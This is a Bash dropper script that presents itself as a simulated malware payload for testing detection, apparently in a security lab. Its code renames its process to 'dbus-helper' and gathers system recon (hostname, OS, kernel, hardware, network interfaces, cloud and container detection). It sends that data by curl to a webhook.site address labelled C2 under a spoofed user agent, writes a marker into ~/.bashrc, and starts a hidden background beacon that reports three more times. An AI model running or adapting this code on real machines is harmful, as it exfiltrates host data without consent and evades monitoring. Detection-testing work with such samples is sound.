#!/usr/bin/env bash
# payload.sh — Bash dropper payload for GitHub pull-and-execute simulation.
#
# Identical behavior to payload.c (ELF variant):
#   1. Renames process via /proc/self/comm (works without root on Linux)
#   2. On-host recon — no credentials, only system facts:
#        hostname, OS, kernel, CPU model+cores, RAM, uptime,
#        network interfaces, process count, container/cloud detection
#   3. Formats recon as JSON and POSTs to C2 via curl
#   4. Writes persistence marker to ~/.bashrc
#   5. Background beacon subshell that re-sends every 60s (3 rounds)
#
# Detection surface:
#   - Bash script executed from /tmp
#   - Reads /proc/cpuinfo, /proc/meminfo, /proc/net/dev, /proc/uptime,
#     /etc/os-release, /proc/version, /sys/class/dmi/id/product_name
#   - Counts /proc/[0-9]* entries for process count
#   - curl POST to external HTTPS host
#   - Writes to ~/.bashrc
#   - Long-running background subshell (& disown) from /tmp path

set -euo pipefail

C2_URL="https://webhook.site/dbd140f9-c980-48c0-96c8-e4ef8865932c"
LOG_FILE="/tmp/.payload.log"

plog() { printf '%s\n' "$*" >> "$LOG_FILE"; }

# ---------------------------------------------------------------------------
# Process masquerade — write to /proc/self/comm (works without root)
# ---------------------------------------------------------------------------

printf 'dbus-helper' > /proc/self/comm 2>/dev/null || true

plog "[payload] started pid=$$ uid=$(id -u)"

# ---------------------------------------------------------------------------
# Recon collectors
# ---------------------------------------------------------------------------

collect_os_name() {
    grep '^NAME=' /etc/os-release 2>/dev/null | cut -d= -f2 | tr -d '"' || echo "unknown"
}

collect_os_version() {
    grep '^VERSION=' /etc/os-release 2>/dev/null | cut -d= -f2 | tr -d '"' || echo "unknown"
}

collect_kernel() {
    head -1 /proc/version 2>/dev/null | tr -d '\n' || echo "unknown"
}

collect_cpu_model() {
    grep '^model name' /proc/cpuinfo 2>/dev/null | head -1 | cut -d: -f2 | sed 's/^ *//' || echo "unknown"
}

collect_cpu_cores() {
    grep -c '^processor' /proc/cpuinfo 2>/dev/null || echo 0
}

collect_ram_mb() {
    awk '/^MemTotal:/{print int($2/1024)}' /proc/meminfo 2>/dev/null || echo 0
}

collect_uptime_min() {
    awk '{print int($1/60)}' /proc/uptime 2>/dev/null || echo 0
}

collect_interfaces() {
    awk 'NR>2 && !/lo:/{gsub(/:.*/,"",$1); printf "%s ", $1}' /proc/net/dev 2>/dev/null | sed 's/ $//' || echo "unknown"
}

count_procs() {
    ls /proc | grep -c '^[0-9]' 2>/dev/null || echo 0
}

is_container() {
    [[ -f /.dockerenv ]] && { echo "true"; return; }
    if grep -qE 'docker|lxc|kubepods' /proc/1/cgroup 2>/dev/null; then
        echo "true"; return
    fi
    echo "false"
}

detect_cloud() {
    local dmi
    dmi=$(cat /sys/class/dmi/id/product_name 2>/dev/null | tr -d '\n') || dmi=""
    if   [[ "$dmi" == *HVM*     ]]; then echo "AWS"
    elif [[ "$dmi" == *Google*  ]]; then echo "GCP"
    elif [[ "$dmi" == *Virtual* ]]; then echo "Azure"
    elif [[ -n "$dmi"           ]]; then echo "$dmi"
    elif [[ "$(is_container)"   == "true" ]]; then echo "container"
    else echo "unknown"
    fi
}

# JSON-escape a string (escapes backslash, double-quote, and newlines).
json_str() {
    local s="$1"
    s="${s//\\/\\\\}"
    s="${s//\"/\\\"}"
    s="${s//$'\n'/\\n}"
    printf '%s' "$s"
}

# ---------------------------------------------------------------------------
# Build JSON recon blob
# ---------------------------------------------------------------------------

build_recon() {
    local hostname os_name os_ver kernel cpu_model cpu_cores ram_mb
    local uptime_min ifaces proc_count cloud container

    hostname=$(hostname)
    os_name=$(collect_os_name)
    os_ver=$(collect_os_version)
    kernel=$(collect_kernel)
    cpu_model=$(collect_cpu_model)
    cpu_cores=$(collect_cpu_cores)
    ram_mb=$(collect_ram_mb)
    uptime_min=$(collect_uptime_min)
    ifaces=$(collect_interfaces)
    proc_count=$(count_procs)
    cloud=$(detect_cloud)
    container=$(is_container)

    printf '{
  "hostname":      "%s",
  "uid":           %d,
  "os_name":       "%s",
  "os_version":    "%s",
  "kernel":        "%s",
  "cpu_model":     "%s",
  "cpu_cores":     %s,
  "ram_mb":        %s,
  "uptime_min":    %s,
  "interfaces":    "%s",
  "process_count": %s,
  "cloud":         "%s",
  "container":     %s,
  "source":        "mf2-payload-bash"
}' \
        "$(json_str "$hostname")" \
        "$(id -u)" \
        "$(json_str "$os_name")" \
        "$(json_str "$os_ver")" \
        "$(json_str "$kernel")" \
        "$(json_str "$cpu_model")" \
        "$cpu_cores" \
        "$ram_mb" \
        "$uptime_min" \
        "$(json_str "$ifaces")" \
        "$proc_count" \
        "$(json_str "$cloud")" \
        "$container"
}

# ---------------------------------------------------------------------------
# Exfil via curl
# ---------------------------------------------------------------------------

exfil() {
    local json="$1"
    plog "[payload] exfil: ${#json} bytes"
    local rc=0
    curl -sf -o /dev/null \
        -X POST "$C2_URL" \
        -H "Content-Type: application/json" \
        -H "User-Agent: Mozilla/5.0 (Linux) Update/1.0" \
        --data "$json" || rc=$?
    plog "[payload] exfil curl exit=$rc"
}

# ---------------------------------------------------------------------------
# Persistence
# ---------------------------------------------------------------------------

write_persistence() {
    local rc="${HOME:-}/.bashrc"
    [[ -z "$rc" || "$rc" == "/.bashrc" ]] && return
    plog "[payload] writing persistence to $rc"
    printf '\n# system update helper\n# exec /tmp/.update-helper &>/dev/null &\n' >> "$rc"
}

# ---------------------------------------------------------------------------
# Background beacon subshell
# ---------------------------------------------------------------------------

start_beacon() {
    (
        printf 'dbus-helper' > /proc/self/comm 2>/dev/null || true
        plog "[beacon] started pid=$$"
        for i in 1 2 3; do
            sleep 60
            local json
            json=$(build_recon)
            exfil "$json"
            plog "[beacon] round $i sent"
        done
        plog "[beacon] done"
    ) &
    local beacon_pid=$!
    disown "$beacon_pid"
    plog "[payload] beacon child pid=$beacon_pid"
}

# ---------------------------------------------------------------------------
# Main
# ---------------------------------------------------------------------------

RECON=$(build_recon)
plog "[payload] recon: $RECON"

exfil "$RECON"
write_persistence
start_beacon

plog "[payload] parent done, beacon running"
